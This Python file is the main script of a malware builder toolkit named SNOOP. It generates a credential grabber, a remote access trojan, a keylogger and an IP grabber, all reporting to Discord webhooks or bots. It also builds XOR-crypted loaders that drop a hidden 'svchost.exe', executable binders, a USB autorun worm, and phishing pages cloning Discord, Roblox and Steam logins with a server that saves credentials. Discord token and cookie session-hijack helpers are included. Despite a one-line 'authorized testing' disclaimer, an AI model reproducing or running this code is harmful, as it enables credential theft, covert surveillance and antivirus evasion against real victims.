import sys
import time
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "stub"))
import json
import base64
import shutil
import re
import subprocess
import random
import tkinter
from tkinter import filedialog
from pathlib import Path
from datetime import datetime
import logging
import threading
import socket
import ipaddress
from concurrent.futures import ThreadPoolExecutor
import ctypes
import webbrowser

# -------------------------------------------------------------------
#  Project paths
# -------------------------------------------------------------------
BASE_DIR = Path(__file__).parent.absolute()
STUB_DIR = BASE_DIR / "stub"
MODULES_DIR = BASE_DIR / "modules"
OUTPUT_DIR = BASE_DIR / "output"
BUILD_OUTPUT_DIR = OUTPUT_DIR / "build_output"
LOG_FILE = BASE_DIR / "snoop.log"
CONFIG_FILE = BASE_DIR / "core" / "config.json"

for d in [STUB_DIR, MODULES_DIR, OUTPUT_DIR, BUILD_OUTPUT_DIR]:
    d.mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(LOG_FILE, encoding='utf-8'), logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("SNOOP")

# -------------------------------------------------------------------
#  Core UI imports
# -------------------------------------------------------------------
from core.display import (
    Theme, Colorate, Colors, clr, get_inpt, print_banner,
    boot_anim, matrix_effect, init_os, type_print
)
from core.paginated_ui import PaginatedUI, PAGES
from core.themes import get_theme_colors, get_available_themes

# -------------------------------------------------------------------
#  Dependency installer (fallback)
# -------------------------------------------------------------------
def _init():
    """Install missing dependencies automatically if not already present."""
    try:
        import pystyle, requests, selenium, dns.resolver, bs4, socks, websocket, piexif, exifread, mutagen, PyQt5, colorama, webdriver_manager, pillow, flask, werkzeug, aiohttp, psutil, whois, phonenumbers, pynput, pywin32, mnemonic, stem, pycryptodome
    except:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pystyle", "requests", "selenium", "dnspython", "beautifulsoup4", "pysocks", "websocket-client", "piexif", "exifread", "mutagen", "PyQt5", "colorama", "webdriver-manager", "pillow", "flask", "werkzeug", "aiohttp", "psutil", "whois", "phonenumbers", "pynput", "pywin32", "mnemonic", "stem", "pycryptodome", "-q"])

_init()

# -------------------------------------------------------------------
#  Imports (pystyle / colorama)
# -------------------------------------------------------------------
try:
    from pystyle import Colorate, Colors, Center, System
    PYSTYLE = True
except:
    PYSTYLE = False

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except:
    class Fore:
        RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
        BLUE = '\033[94m'; MAGENTA = '\033[95m'; CYAN = '\033[96m'
        WHITE = '\033[97m'; RESET = '\033[0m'
        LIGHTMAGENTA_EX = '\033[95m'; LIGHTCYAN_EX = '\033[96m'
    class Style:
        RESET_ALL = '\033[0m'; BRIGHT = '\033[1m'

try:
    import psutil
    PSUTIL = True
except:
    PSUTIL = False

try:
    import discord_tools as dt
    DISCORD_TOOLS_AVAILABLE = True
except ImportError:
    DISCORD_TOOLS_AVAILABLE = False
    print("[!] discord_tools.py not found – Discord tools disabled")

# -------------------------------------------------------------------
#  Configuration helpers
# -------------------------------------------------------------------
def load_config():
    """Load the global configuration from CONFIG_FILE."""
    if CONFIG_FILE.exists():
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            pass
    return {}

def save_config(cfg):
    """Save the global configuration to CONFIG_FILE."""
    try:
        CONFIG_FILE.parent.mkdir(parents=True, exist_ok=True)
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(cfg, f, indent=4)
    except:
        pass

# -------------------------------------------------------------------
#  Utility functions
# -------------------------------------------------------------------
def validate_url(url):
    """Check if the given string is a valid HTTP/HTTPS URL."""
    return url.startswith("http://") or url.startswith("https://")

def select_icon():
    """Open a file dialog to select an .ico file."""
    try:
        root = tkinter.Tk()
        root.withdraw()
        path = filedialog.askopenfilename(title="Choose an icon", filetypes=[("ICO files", "*.ico")])
        root.destroy()
        return Path(path) if path else None
    except:
        return None

def replace_webhook_assignment(text, new_url, keys):
    """
    Replace webhook assignments in a template string.
    Returns (new_text, number_of_replacements).
    """
    total = 0
    new_text = text
    for key in keys:
        pattern = re.compile(r'(' + re.escape(key) + r'\s*=\s*)(["\'])(.*?)\2', flags=re.IGNORECASE)
        def repl(m):
            return f"{m.group(1)}{m.group(2)}{new_url}{m.group(2)}"
        new_text, n = pattern.subn(repl, new_text)
        total += n
    return new_text, total

# -------------------------------------------------------------------
#  PyInstaller wrapper
# -------------------------------------------------------------------
def compile_pyinstaller(source, name, icon_path=None, console=False, onefile=True, extra_hidden=None):
    """
    Compile a Python script into an executable using PyInstaller.
    Returns True on success, False otherwise.
    """
    if extra_hidden is None:
        extra_hidden = []
    cmd = [sys.executable, "-m", "PyInstaller", "--clean", "--noconfirm"]
    if onefile:
        cmd.append("--onefile")
    else:
        cmd.append("--onedir")
    if not console:
        cmd.append("--noconsole")
    if icon_path and Path(icon_path).exists():
        cmd.append(f"--icon={icon_path}")

    upx_path = shutil.which("upx")
    if not upx_path:
        local_upx = Path("upx.exe") if os.name == 'nt' else Path("upx")
        if local_upx.exists():
            upx_path = str(local_upx)

    if upx_path:
        cmd.append("--upx-dir")
        cmd.append(os.path.dirname(upx_path))
        logger.info(f"UPX compression enabled : {upx_path}")
        print(f"{Fore.CYAN}[+] UPX compression enabled{Style.RESET_ALL}")
    else:
        logger.info("UPX not found, skipping compression")

    cmd.extend(["--name", name, str(source)])
    hidden = [
        "win32api", "win32con", "win32crypt", "win32process",
        "win32com.client", "ctypes", "PIL._imagingft",
        "pyautogui._pyautogui_win", "pynput.keyboard._win32",
        "pynput.mouse._win32", "Crypto", "Crypto.Cipher", "discord",
        "aiohttp", "mss", "psutil", "cv2", "pyautogui", "pynput",
        "browserhistory", "pyaudio", "wave", "numpy", "pyperclip",
        "win32service", "win32serviceutil", "comtypes", "win32net",
        "win32evtlog", "win32security", "flask", "werkzeug"
    ] + extra_hidden
    hidden = list(set(hidden))
    for h in hidden:
        cmd.extend(["--hidden-import", h])
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        for f in Path.cwd().glob("*.spec"):
            f.unlink()
        if Path("build").exists():
            shutil.rmtree("build", ignore_errors=True)
        if proc.returncode == 0:
            exe = Path("dist") / f"{name}.exe"
            if exe.exists():
                size = exe.stat().st_size / (1024*1024)
                logger.info(f"Build successful: {exe} ({size:.1f} MB)")
                print(f"{Fore.GREEN}[+] Build successful: {exe} ({size:.1f} MB){Style.RESET_ALL}")
                return True
        return False
    except:
        return False

# -------------------------------------------------------------------
#  Builder functions (payload generators)
# -------------------------------------------------------------------
def build_grabber(webhook, output_name, icon_path=None, as_exe=False):
    """Generate a Grabber payload (Python or EXE)."""
    base = STUB_DIR / "base_code.py"
    if not base.exists():
        print(f"{Fore.RED}[!] base_code.py not found.{Style.RESET_ALL}")
        return False
    src = base.read_text(encoding="utf-8")
    new_src, _ = replace_webhook_assignment(src, webhook, ["WEBHOOK_URL", "WEBHOOK", "DISCORD_WEBHOOK"])
    py_out = BUILD_OUTPUT_DIR / f"{output_name}.py"
    py_out.write_text(new_src, encoding="utf-8")
    print(f"{Fore.GREEN}[+] Python file: {py_out}{Style.RESET_ALL}")
    if as_exe:
        if input("Run PyInstaller? (y/n) [n]: ").strip().lower() in ('y', 'yes'):
            return compile_pyinstaller(py_out, output_name, icon_path, console=False, onefile=True)
    return True

def build_rat(token, channel_id, output_name, icon_path=None, console=False, onefile=True):
    """Generate a RAT payload (Python -> EXE)."""
    template = STUB_DIR / "rat_template.py"
    if not template.exists():
        print(f"{Fore.RED}[!] rat_template.py not found.{Style.RESET_ALL}")
        return False
    code = template.read_text(encoding="utf-8")
    code = code.replace("YOUR_BASE64_ENCODED_TOKEN_HERE", base64.b64encode(token.encode()).decode())
    code = code.replace("YOUR_BASE64_ENCODED_CHANNEL_ID_HERE", base64.b64encode(channel_id.encode()).decode())
    temp_file = Path("temp_build_rat.py")
    temp_file.write_text(code, encoding="utf-8")
    success = compile_pyinstaller(temp_file, output_name, icon_path, console, onefile, extra_hidden=["flask", "werkzeug"])
    if temp_file.exists():
        temp_file.unlink()
    return success

def build_ip_grabber(webhook, output_name, icon_path=None, as_exe=False):
    """Generate an IP Grabber payload."""
    template = STUB_DIR / "ip_grabber_template.py"
    if not template.exists():
        print(f"{Fore.RED}[!] ip_grabber_template.py not found.{Style.RESET_ALL}")
        return False
    src = template.read_text(encoding="utf-8")
    new_src = src.replace("IP_GRABBER_WEBHOOK_PLACEHOLDER", webhook)
    py_out = BUILD_OUTPUT_DIR / f"{output_name}.py"
    py_out.write_text(new_src, encoding="utf-8")
    print(f"{Fore.GREEN}[+] Python file: {py_out}{Style.RESET_ALL}")
    if as_exe:
        if input("Run PyInstaller? (y/n) [n]: ").strip().lower() in ('y', 'yes'):
            return compile_pyinstaller(py_out, output_name, icon_path, console=False, onefile=True)
    return True

def build_keylogger(webhook, output_name, icon_path=None, as_exe=False):
    """Generate a Keylogger payload."""
    template = STUB_DIR / "keylogger_template.py"
    if not template.exists():
        print(f"{Fore.RED}[!] keylogger_template.py not found.{Style.RESET_ALL}")
        return False
    src = template.read_text(encoding="utf-8")
    new_src = src.replace("KEYLOGGER_WEBHOOK_PLACEHOLDER", webhook)
    py_out = BUILD_OUTPUT_DIR / f"{output_name}.py"
    py_out.write_text(new_src, encoding="utf-8")
    print(f"{Fore.GREEN}[+] Python file: {py_out}{Style.RESET_ALL}")
    if as_exe:
        if input("Run PyInstaller? (y/n) [n]: ").strip().lower() in ('y', 'yes'):
            return compile_pyinstaller(py_out, output_name, icon_path, console=False, onefile=True,
                                       extra_hidden=["pynput.keyboard._win32", "pynput.mouse._win32"])
    return True

def build_blocker(webhook, command_url, output_name, check_interval=10, startup=True, self_destruct_days=14, icon_path=None, as_exe=False):
    """Generate a Blocker payload."""
    template = STUB_DIR / "blocker_template.py"
    if not template.exists():
        print(f"{Fore.RED}[!] blocker_template.py not found.{Style.RESET_ALL}")
        return False
    src = template.read_text(encoding="utf-8")
    src = src.replace("BLOCKER_WEBHOOK_PLACEHOLDER", webhook)
    src = src.replace("BLOCKER_COMMAND_SOURCE_PLACEHOLDER", command_url)
    src = src.replace("BLOCKER_CHECK_INTERVAL_PLACEHOLDER", str(check_interval))
    src = src.replace("BLOCKER_STARTUP_ENABLED_PLACEHOLDER", str(startup))
    src = src.replace("BLOCKER_SELF_DESTRUCT_DAYS_PLACEHOLDER", str(self_destruct_days))
    py_out = BUILD_OUTPUT_DIR / f"{output_name}.py"
    py_out.write_text(src, encoding="utf-8")
    print(f"{Fore.GREEN}[+] Python file: {py_out}{Style.RESET_ALL}")
    if as_exe:
        if input("Run PyInstaller? (y/n) [n]: ").strip().lower() in ('y', 'yes'):
            return compile_pyinstaller(py_out, output_name, icon_path, console=False, onefile=True,
                                       extra_hidden=["pynput.keyboard._win32", "pynput.mouse._win32"])
    return True

def build_binder(exe1_path, exe2_path, output_name):
    """Bind two executables into one."""
    if not Path(exe1_path).exists() or not Path(exe2_path).exists():
        print(f"{Fore.RED}[!] One of the EXE files not found.{Style.RESET_ALL}")
        return False
    with open(exe1_path, 'rb') as f: b64_1 = base64.b64encode(f.read()).decode()
    with open(exe2_path, 'rb') as f: b64_2 = base64.b64encode(f.read()).decode()
    loader = f'''
import os, sys, subprocess, tempfile, base64, time, ctypes
def extract_and_run(data, fname):
    p = os.path.join(tempfile.gettempdir(), fname)
    with open(p, 'wb') as f: f.write(data)
    subprocess.Popen([p], creationflags=subprocess.CREATE_NO_WINDOW)
    time.sleep(1)
if __name__ == "__main__":
    d1 = b"{b64_1}"; d2 = b"{b64_2}"
    extract_and_run(base64.b64decode(d1), "part1.exe")
    extract_and_run(base64.b64decode(d2), "part2.exe")
'''
    temp_file = Path("temp_binder.py")
    temp_file.write_text(loader, encoding="utf-8")
    success = compile_pyinstaller(temp_file, output_name, None, console=False, onefile=True)
    temp_file.unlink()
    return success

def build_crypter(exe_path, output_name):
    """Crypt an executable (XOR + loader)."""
    if not Path(exe_path).exists():
        print(f"{Fore.RED}[!] EXE file not found.{Style.RESET_ALL}")
        return False
    key = random.randint(1, 255)
    with open(exe_path, 'rb') as f: raw = f.read()
    encrypted = base64.b64encode(bytes([b ^ key for b in raw])).decode()
    loader = f'''
import os, sys, base64, tempfile, subprocess, ctypes, time
key = {key}
data = base64.b64decode("{encrypted}")
decrypted = bytes([b ^ key for b in data])
p = os.path.join(tempfile.gettempdir(), "svchost.exe")
with open(p, 'wb') as f: f.write(decrypted)
ctypes.windll.kernel32.SetFileAttributesW(p, 2)
subprocess.Popen([p], creationflags=subprocess.CREATE_NO_WINDOW)
sys.exit()
'''
    temp_file = Path("temp_crypter.py")
    temp_file.write_text(loader, encoding="utf-8")
    success = compile_pyinstaller(temp_file, output_name, None, console=False, onefile=True)
    temp_file.unlink()
    return success

def build_fusion(output_name, icon_path=None):
    """Merge Grabber and RAT into one payload."""
    grabber_template = STUB_DIR / "base_code.py"
    rat_template = STUB_DIR / "rat_template.py"
    if not grabber_template.exists() or not rat_template.exists():
        print(f"{Fore.RED}[!] base_code.py or rat_template.py not found.{Style.RESET_ALL}")
        return False
    webhook = input("Webhook URL for Grabber: ").strip()
    if not validate_url(webhook):
        print(f"{Fore.RED}[!] Invalid URL.{Style.RESET_ALL}")
        return False
    rat_token = input("Discord token for RAT: ").strip()
    rat_channel = input("Channel ID for RAT: ").strip()
    if not rat_token or not rat_channel:
        print(f"{Fore.RED}[!] Token and channel required.{Style.RESET_ALL}")
        return False
    grabber_src = grabber_template.read_text(encoding="utf-8")
    rat_src = rat_template.read_text(encoding="utf-8")
    grabber_src, _ = replace_webhook_assignment(grabber_src, webhook, ["WEBHOOK_URL", "WEBHOOK"])
    rat_src = rat_src.replace("YOUR_BASE64_ENCODED_TOKEN_HERE", base64.b64encode(rat_token.encode()).decode())
    rat_src = rat_src.replace("YOUR_BASE64_ENCODED_CHANNEL_ID_HERE", base64.b64encode(rat_channel.encode()).decode())
    fusion_code = f'''
import subprocess, sys, os, threading, time, ctypes
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
{grabber_src}
{rat_src}
def run_grabber():
    try: main()
    except: pass
def run_rat():
    try:
        rat_globals = {{}}
        exec(rat_src, rat_globals)
        rat_globals['main']()
    except: pass
if __name__ == "__main__":
    t1 = threading.Thread(target=run_grabber)
    t1.daemon = True; t1.start()
    time.sleep(2)
    t2 = threading.Thread(target=run_rat)
    t2.daemon = True; t2.start()
    while True: time.sleep(10)
'''
    temp_file = Path("temp_fusion.py")
    temp_file.write_text(fusion_code, encoding="utf-8")
    success = compile_pyinstaller(temp_file, output_name, icon_path, console=False, onefile=True)
    temp_file.unlink()
    return success

def build_crypted_rat(token, channel_id, output_name, icon_path=None, console=False, onefile=True):
    """Build an encrypted RAT (XOR + loader)."""
    template = STUB_DIR / "rat_template.py"
    if not template.exists():
        print(f"{Fore.RED}[!] rat_template.py not found.{Style.RESET_ALL}")
        return False
    code = template.read_text(encoding="utf-8")
    code = code.replace("YOUR_BASE64_ENCODED_TOKEN_HERE", base64.b64encode(token.encode()).decode())
    code = code.replace("YOUR_BASE64_ENCODED_CHANNEL_ID_HERE", base64.b64encode(channel_id.encode()).decode())
    key = random.randint(1, 255)
    encrypted = base64.b64encode(bytes([b ^ key for b in code.encode('utf-8')])).decode()
    loader = f'''
import base64, os, sys, ctypes, subprocess, tempfile, time
KEY = {key}; ENCRYPTED = \"\"\"{encrypted}\"\"\"
def decrypt_and_run():
    try:
        encrypted = base64.b64decode(ENCRYPTED)
        decrypted = bytes([b ^ KEY for b in encrypted])
        exec(decrypted.decode('utf-8'))
    except:
        temp = os.path.join(tempfile.gettempdir(), "temp.py")
        with open(temp, 'w') as f: f.write(decrypted.decode('utf-8'))
        subprocess.Popen([sys.executable, temp], creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(2)
        try: os.remove(temp)
        except: pass
if __name__ == "__main__":
    try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except: pass
    decrypt_and_run()
'''
    temp = Path("temp_loader_rat.py")
    temp.write_text(loader, encoding="utf-8")
    success = compile_pyinstaller(temp, output_name, icon_path, console, onefile)
    temp.unlink()
    return success

def build_crypted_grabber(webhook, output_name, icon_path=None, console=False, onefile=True):
    """Build an encrypted Grabber (XOR + loader)."""
    template = STUB_DIR / "base_code.py"
    if not template.exists():
        print(f"{Fore.RED}[!] base_code.py not found.{Style.RESET_ALL}")
        return False
    code = template.read_text(encoding="utf-8")
    code, _ = replace_webhook_assignment(code, webhook, ["WEBHOOK_URL", "WEBHOOK"])
    key = random.randint(1, 255)
    encrypted = base64.b64encode(bytes([b ^ key for b in code.encode('utf-8')])).decode()
    loader = f'''
import base64, os, sys, ctypes, subprocess, tempfile, time
KEY = {key}; ENCRYPTED = \"\"\"{encrypted}\"\"\"
def decrypt_and_run():
    try:
        encrypted = base64.b64decode(ENCRYPTED)
        decrypted = bytes([b ^ KEY for b in encrypted])
        exec(decrypted.decode('utf-8'))
    except:
        temp = os.path.join(tempfile.gettempdir(), "temp.py")
        with open(temp, 'w') as f: f.write(decrypted.decode('utf-8'))
        subprocess.Popen([sys.executable, temp], creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(2)
        try: os.remove(temp)
        except: pass
if __name__ == "__main__":
    try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except: pass
    decrypt_and_run()
'''
    temp = Path("temp_loader_grabber.py")
    temp.write_text(loader, encoding="utf-8")
    success = compile_pyinstaller(temp, output_name, icon_path, console, onefile)
    temp.unlink()
    return success

def build_usb_worm():
    """Create a USB worm folder with autorun."""
    print(f"{Fore.CYAN}[*] USB Worm Generator{Style.RESET_ALL}")
    exe_path = input("Path to EXE to copy to USB: ").strip()
    if not Path(exe_path).exists():
        print(f"{Fore.RED}[!] File not found.{Style.RESET_ALL}")
        return
    drive = input("USB drive letter (e.g., E:) or leave empty: ").strip()
    output_dir = Path("USB_Worm")
    output_dir.mkdir(exist_ok=True)
    if drive:
        dest = Path(drive)
        if not dest.exists():
            print(f"{Fore.RED}[!] Drive {drive} not found.{Style.RESET_ALL}")
            return
        output_dir = dest
    exe_name = Path(exe_path).name
    shutil.copy(exe_path, output_dir / exe_name)
    if drive:
        (output_dir / "autorun.inf").write_text(f"""[AutoRun]\nopen={exe_name}\naction=Open folder to view files\nshell\\open\\command={exe_name}\nshell\\open\\Default=1\n""")
    (output_dir / "setup.bat").write_text(f"""@echo off\nstart "" "{exe_name}"\nexit\n""")
    print(f"{Fore.GREEN}[+] USB Worm folder created at {output_dir}{Style.RESET_ALL}")

def build_network_scanner():
    """Generate a network scanner executable."""
    print(f"{Fore.CYAN}[*] Advanced Network Scanner Generator{Style.RESET_ALL}")
    output_name = input("Output EXE name [NetworkScanner]: ").strip() or "NetworkScanner"
    scanner = '''import socket, threading, os, time, sys, ipaddress
from concurrent.futures import ThreadPoolExecutor
COMMON_PORTS = {21:'FTP',22:'SSH',23:'Telnet',25:'SMTP',53:'DNS',80:'HTTP',110:'POP3',135:'RPC',139:'NetBIOS',143:'IMAP',443:'HTTPS',445:'SMB',3306:'MySQL',3389:'RDP',5432:'PostgreSQL',5900:'VNC',8080:'HTTP-Alt'}
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except: return '127.0.0.1'
def scan_host(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((ip, port))
        sock.close()
        if result == 0: return port, True
    except: pass
    return port, False
def scan_ip(ip, ports):
    open_ports = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(scan_host, ip, port) for port in ports]
        for future in futures:
            port, is_open = future.result()
            if is_open:
                service = COMMON_PORTS.get(port, 'Unknown')
                open_ports.append((port, service))
    return ip, open_ports
def main():
    try:
        local_ip = get_local_ip()
        base = '.'.join(local_ip.split('.')[:3]) + '.'
        print(f"[+] Local IP: {local_ip}")
        print(f"[+] Scanning network {base}0/24")
        hosts = [base + str(i) for i in range(1, 255)]
        results = []
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(scan_ip, h, COMMON_PORTS.keys()) for h in hosts]
            for future in futures:
                ip, open_ports = future.result()
                if open_ports: results.append((ip, open_ports))
        print("\\n[+] Scan results:")
        for ip, ports in results:
            print(f"  {ip}:")
            for port, service in ports:
                print(f"    Port {port} ({service}) open")
    except Exception as e:
        print(f"Error: {e}")
if __name__ == "__main__": main()
'''
    temp = Path("temp_scanner.py")
    temp.write_text(scanner, encoding="utf-8")
    compile_pyinstaller(temp, output_name, None, console=True, onefile=True)
    temp.unlink()

def build_phishing_page():
    """Generate a phishing page (Discord/Roblox/Steam/Custom)."""
    print(f"{Fore.CYAN}[*] Phishing Page Generator{Style.RESET_ALL}")
    print("  1. Discord\n  2. Roblox\n  3. Steam\n  4. Custom")
    choice = input("Your choice (1-4): ").strip()
    templates = {'1':{'name':'Discord','title':'Discord - Login','logo':'https://cdn.discordapp.com/assets/logo-1.png'},
                 '2':{'name':'Roblox','title':'Roblox - Login','logo':'https://www.roblox.com/asset/?id=0'},
                 '3':{'name':'Steam','title':'Steam - Login','logo':'https://store.steampowered.com/favicon.ico'}}
    if choice in templates: template = templates[choice]
    elif choice == '4':
        title = input("Page title: ").strip()
        logo_url = input("Logo URL: ").strip()
        template = {'name':'Custom','title':title,'logo':logo_url}
    else:
        print(f"{Fore.RED}[!] Invalid choice.{Style.RESET_ALL}")
        return
    output_dir = Path("Phishing_Page")
    output_dir.mkdir(exist_ok=True)
    html = f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>{template['title']}</title>
<style>body{{font-family:Arial,sans-serif;background:#0a0a0a;color:white;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}}
.container{{background:#1a1a1a;padding:40px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,0.5);width:320px;text-align:center;}}
.logo{{width:100px;margin-bottom:20px;}}
input{{width:90%;padding:12px;margin:8px 0;border:1px solid #333;border-radius:4px;background:#2a2a2a;color:white;}}
button{{width:100%;padding:12px;background:#7B2FBE;border:none;border-radius:4px;color:white;font-weight:bold;cursor:pointer;}}
button:hover{{background:#6A1FAD;}}
.error{{color:#ff4444;display:none;}}
</style></head>
<body>
<div class="container">
<img src="{template['logo']}" class="logo"><h2>{template['title']}</h2>
<form id="loginForm">
<input type="text" id="email" placeholder="Email / Username" required>
<input type="password" id="password" placeholder="Password" required>
<button type="submit">Login</button>
</form>
<p class="error" id="errorMsg">Invalid credentials.</p>
<p style="margin-top:20px;font-size:12px;color:#666;">&copy; {template['name']}</p>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {{
e.preventDefault();
var email = document.getElementById('email').value;
var password = document.getElementById('password').value;
fetch('/login', {{
method: 'POST',
headers: {{'Content-Type': 'application/json'}},
body: JSON.stringify({{email: email, password: password}})
}})
.then(response => response.json())
.then(data => {{
if (data.status === 'success') {{
document.getElementById('errorMsg').style.display = 'none';
alert('Login successful!');
window.location.href = 'https://' + data.redirect;
}} else {{
document.getElementById('errorMsg').style.display = 'block';
}}
}});
}});
</script>
</body></html>'''
    (output_dir / "index.html").write_text(html, encoding="utf-8")
    server = f'''from flask import Flask, request, jsonify, render_template_string
import os, json, datetime
app = Flask(__name__)
LOGS_FILE = "credentials.txt"
@app.route('/')
def index():
    with open('index.html','r') as f: return render_template_string(f.read())
@app.route('/login', methods=['POST'])
def login():
    data = request.json
    email, password = data.get('email',''), data.get('password','')
    with open(LOGS_FILE, 'a') as f: f.write(f"{{datetime.datetime.now()}} | Email: {{email}} | Pass: {{password}}\\n")
    redirect = {{'Discord':'discord.com/login','Roblox':'www.roblox.com/login','Steam':'store.steampowered.com/login'}}.get('{template['name']}','www.google.com')
    return jsonify({{'status':'success','redirect': redirect}})
if __name__ == '__main__': app.run(host='0.0.0.0', port=8080, debug=False)
'''
    (output_dir / "server.py").write_text(server, encoding="utf-8")
    (output_dir / "run_server.bat").write_text("""@echo off\necho Starting phishing server...\npython server.py\npause\n""")
    shutil.make_archive("Phishing_Page", 'zip', output_dir)
    print(f"{Fore.GREEN}[+] Phishing folder generated: {output_dir}{Style.RESET_ALL}")

# -------------------------------------------------------------------
#  Login helpers (Discord token / cookie)
# -------------------------------------------------------------------
def discord_token_login(token):
    """Log in to Discord using a token (Selenium)."""
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.service import Service as ChromeService
        from webdriver_manager.chrome import ChromeDriverManager
        from selenium.webdriver.chrome.options import Options
        opts = Options()
        opts.add_experimental_option("detach", True)
        service = ChromeService(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=opts)
        driver.get("https://discord.com/login")
        script = f"""
        function login(token) {{
            setInterval(() => {{
                document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${{token}}"`;
            }}, 50);
            setTimeout(() => {{ location.reload(); }}, 2500);
        }}
        login('{token}');
        """
        driver.execute_script(script)
        print(f"{Fore.GREEN}[+] Login launched.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
    input("\nPress Enter...")

def cookie_login():
    """Inject cookies into the browser to log in to a website."""
    cookie_str = input(f"{Fore.YELLOW}Cookie (name=value; ...): {Style.RESET_ALL}").strip()
    if not cookie_str: return
    url = input(f"{Fore.YELLOW}Target URL: {Style.RESET_ALL}").strip()
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.service import Service as ChromeService
        from webdriver_manager.chrome import ChromeDriverManager
        from selenium.webdriver.chrome.options import Options
        opts = Options()
        opts.add_experimental_option("detach", True)
        service = ChromeService(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=opts)
        driver.get(url)
        time.sleep(2)
        for pair in cookie_str.split(';'):
            pair = pair.strip()
            if '=' in pair:
                name, value = pair.split('=', 1)
                driver.add_cookie({'name': name, 'value': value, 'domain': driver.current_url.split('/')[2]})
        driver.refresh()
        print(f"{Fore.GREEN}[+] Cookie injected.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
    input("\nPress Enter...")

def run_roblox_tools():
    """Launch the Roblox tools module."""
    roblox_script = STUB_DIR / "roblox.py"
    if roblox_script.exists():
        try:
            subprocess.run([sys.executable, str(roblox_script)], check=True)
        except Exception as e:
            print(f"{Fore.RED}[!] Error launching Roblox tools: {e}{Style.RESET_ALL}")
            input("Press Enter...")
    else:
        print(f"{Fore.RED}[!] roblox.py not found in stub/{Style.RESET_ALL}")
        input("Press Enter...")

# -------------------------------------------------------------------
#  Menu helpers (help, version, settings)
# -------------------------------------------------------------------
def help_menu():
    """Display the help menu."""
    clr()
    cfg = load_config()
    ver = cfg.get("version", "1.0.0")
    help_text = f"""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                    SNOOP - Advanced Toolkit v{ver}              ║
    ║                                                               ║
    ║  A comprehensive toolkit for security research and            ║
    ║  penetration testing. All modules are self-contained          ║
    ║  and designed for authorized security testing.                ║
    ║                                                               ║
    ║  Categories:                                                  ║
    ║    [1] Malicious Tools - Payloads, RAT, DDoS, scanners        ║
    ║    [2] Discord Tools - Selfbot, raid, webhook, tokens         ║
    ║    [3] OSINT Tools - IP, email, phone, whois, dns, dox        ║
    ║    [4] Tools - Binder, crypter, fusion, obfuscator            ║
    ║    [5] Login Tools - Token & cookie login                     ║
    ║    [6] Roblox Tools - User info, cookie, group, checker       ║
    ║    [7] Settings - Configuration                               ║
    ║                                                               ║
    ║  Navigation:                                                  ║
    ║    [N] - Next Page    [B] - Previous Page                    ║
    ║    [H] - Help         [V] - Version                          ║
    ║    [S] - Settings     [99] - Exit                            ║
    ║                                                               ║
    ║  ⚠  Use responsibly and only on systems you own.              ║
    ╚═══════════════════════════════════════════════════════════════╝
    """
    print_banner()
    PaginatedUI.draw_card_box("HELP", {"1": "Help content"})
    print(help_text)
    input("\nPress Enter to continue...")

def version_menu():
    """Display the version information."""
    clr()
    print_banner()
    cfg = load_config()
    ver = cfg.get("version", "1.0.0")
    ver_text = f"""
    ╔═══════════════════════════════════════════════╗
    ║         SNOOP - Toolkit v{ver}                  ║
    ║                                               ║
    ║      Author: weaselgb                         ║
    ║      Build date: 2026                         ║
    ║      Discord: https://discord.gg/snoop        ║
    ║      Github:  https://github.com/weaselgb     ║
    ║      version: {ver}                             ║
    ╚═══════════════════════════════════════════════╝
    """
    PaginatedUI.draw_card_box("VERSION", {"1": ver_text.strip()})
    input("\nPress Enter to continue...")

def settings_menu():
    """Manage application settings (themes, clear configuration)."""
    config = load_config()
    while True:
        clr()
        print_banner()

        theme_items = {}
        themes_list = [
            ("01", "snoop"), ("02", "snoop_neon"), ("03", "snoop_dark"),
            ("04", "snoop_holo"), ("05", "purple"), ("06", "blue"),
            ("07", "cyan"), ("08", "pink"), ("09", "rainbow"),
            ("10", "modern"), ("11", "modern_red"), ("12", "modern_purple")
        ]
        current_theme = config.get("theme", "snoop")

        for key, name in themes_list:
            display = name.upper()
            if name == current_theme:
                display = f"{display} ⭐"
            theme_items[key] = display

        theme_items["13"] = "Clear Settings"
        theme_items["99"] = "Back"

        PaginatedUI.draw_card_box("THEMES & SETTINGS", theme_items)

        print(f"  {Fore.CYAN}Current theme: {Fore.MAGENTA}{current_theme.upper()}{Style.RESET_ALL}")
        print()

